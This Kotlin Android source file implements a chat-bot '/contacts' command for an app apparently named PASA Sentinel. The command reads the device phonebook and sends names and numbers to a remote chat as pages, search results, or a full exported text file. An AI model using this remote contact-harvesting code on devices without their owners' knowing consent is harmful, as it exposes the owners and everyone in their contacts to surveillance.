package com.izhaanintellect.pasa.commands

import android.content.Context
import android.provider.ContactsContract
import dagger.hilt.android.qualifiers.ApplicationContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Retrieves contacts from the device phonebook.
 *
 * Commands:
 *   /contacts              — Paginated list (page 1)
 *   /contacts <page>       — View specific page (e.g. /contacts 2)
 *   /contacts export       — Download full phonebook as .txt document
 *   /contacts search <q>   — Search by name or number
 */
@Singleton
class ContactsCommand @Inject constructor(
    @ApplicationContext private val context: Context
) : Command {

    override val name = "/contacts"
    override val description = "List device contacts with pagination, export, and search"
    override val usage = "/contacts [page] | /contacts export | /contacts search <name>"

    companion object {
        private const val PAGE_SIZE = 20
    }

    override suspend fun execute(args: List<String>, chatId: Long): CommandResult {
        val firstArg = args.firstOrNull()?.lowercase()?.trim()

        return try {
            val allContacts = loadAllContacts()

            // Full document export
            if (firstArg == "export" || firstArg == "all" || firstArg == "full") {
                return exportContacts(allContacts)
            }

            // Keyword search
            if (firstArg == "search" || firstArg == "find") {
                val query = args.drop(1).joinToString(" ").lowercase().trim()
                if (query.isBlank()) {
                    return CommandResult(
                        success = false,
                        message = "❌ Please specify a search term.\nUsage: <code>/contacts search &lt;name&gt;</code>"
                    )
                }
                val matches = allContacts.filter { (name, number) ->
                    name.lowercase().contains(query) || number.replace(" ", "").contains(query)
                }
                return renderPage(matches, page = 1, isSearch = true, query = query)
            }

            // Paginated list
            val page = firstArg?.toIntOrNull() ?: 1
            renderPage(allContacts, page = page, isSearch = false)

        } catch (e: SecurityException) {
            CommandResult(
                success = false,
                message = "📇 <b>Contacts Error</b>\n━━━━━━━━━━━━━━━━━━━━\n⚠️ READ_CONTACTS permission not granted."
            )
        } catch (e: Exception) {
            CommandResult(
                success = false,
                message = "📇 <b>Contacts Error</b>\n━━━━━━━━━━━━━━━━━━━━\n❌ ${e.message}"
            )
        }
    }

    private fun loadAllContacts(): List<Pair<String, String>> {
        val contacts = mutableListOf<Pair<String, String>>()
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            projection,
            null,
            null,
            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
        )
        cursor?.use {
            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext()) {
                val name = it.getString(nameIdx) ?: "Unknown"
                val number = it.getString(numIdx) ?: ""
                contacts.add(name to number)
            }
        }
        return contacts
    }

    private fun renderPage(
        contacts: List<Pair<String, String>>,
        page: Int,
        isSearch: Boolean,
        query: String = ""
    ): CommandResult {
        if (contacts.isEmpty()) {
            val note = if (isSearch) " matching \"<b>$query</b>\"" else ""
            return CommandResult(
                success = true,
                message = "📇 <b>Contacts</b>\n━━━━━━━━━━━━━━━━━━━━\n<i>No contacts found$note.</i>"
            )
        }

        val totalPages = maxOf(1, (contacts.size + PAGE_SIZE - 1) / PAGE_SIZE)
        val validPage = page.coerceIn(1, totalPages)
        val startIdx = (validPage - 1) * PAGE_SIZE
        val pageContacts = contacts.drop(startIdx).take(PAGE_SIZE)

        val sb = StringBuilder()
        if (isSearch) {
            sb.appendLine("📇 <b>Contact Search: \"$query\" (${contacts.size} results)</b>")
        } else {
            sb.appendLine("📇 <b>Contacts (${contacts.size})</b> — Page $validPage of $totalPages")
        }
        sb.appendLine("━━━━━━━━━━━━━━━━━━━━")

        pageContacts.forEachIndexed { idx, (name, number) ->
            val num = startIdx + idx + 1
            sb.appendLine("$num. <b>$name</b>")
            sb.appendLine("   📞 <code>$number</code>")
        }

        sb.appendLine("━━━━━━━━━━━━━━━━━━━━")
        val navItems = mutableListOf<String>()
        if (validPage > 1) navItems.add("👈 <code>/contacts ${validPage - 1}</code>")
        if (validPage < totalPages) navItems.add("👉 <code>/contacts ${validPage + 1}</code>")
        if (navItems.isNotEmpty()) sb.appendLine("📄 <b>Page $validPage/$totalPages:</b> ${navItems.joinToString(" • ")}")
        sb.append("💾 Export: <code>/contacts export</code> • 🔍 Search: <code>/contacts search &lt;name&gt;</code>")

        return CommandResult(success = true, message = sb.toString())
    }

    private fun exportContacts(contacts: List<Pair<String, String>>): CommandResult {
        return try {
            val file = File(context.cacheDir, "pasa_contacts_${System.currentTimeMillis()}.txt")
            file.printWriter().use { out ->
                out.println("================================================================================")
                out.println("PASA Sentinel — Complete Device Phonebook Export")
                out.println("Total Contacts: ${contacts.size}")
                out.println("Generated: ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())}")
                out.println("================================================================================")
                out.println()
                contacts.forEachIndexed { i, (name, number) ->
                    out.println("${i + 1}. $name")
                    out.println("   Number: $number")
                    out.println()
                }
            }
            CommandResult(
                success = true,
                message = "📇 <b>Contacts Export (${contacts.size} contacts)</b>\n━━━━━━━━━━━━━━━━━━━━\nFull phonebook document attached below.",
                documentFile = file
            )
        } catch (e: Exception) {
            CommandResult(success = false, message = "❌ Failed to export contacts: ${e.message}")
        }
    }
}
